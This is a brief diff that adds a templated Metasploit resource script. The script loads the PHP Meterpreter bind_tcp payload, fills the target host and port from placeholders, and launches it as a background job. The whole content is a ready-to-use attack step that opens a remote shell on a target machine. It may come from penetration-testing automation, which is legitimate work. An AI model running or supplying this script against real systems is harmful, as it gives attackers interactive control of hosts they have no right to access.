@@ -1,0 +1,5 @@
+use payload/php/meterpreter/bind_tcp
+set RHOST {{TARGET_IP}}
+set RPORT {{TARGET_PORT}}
+
+exploit -j
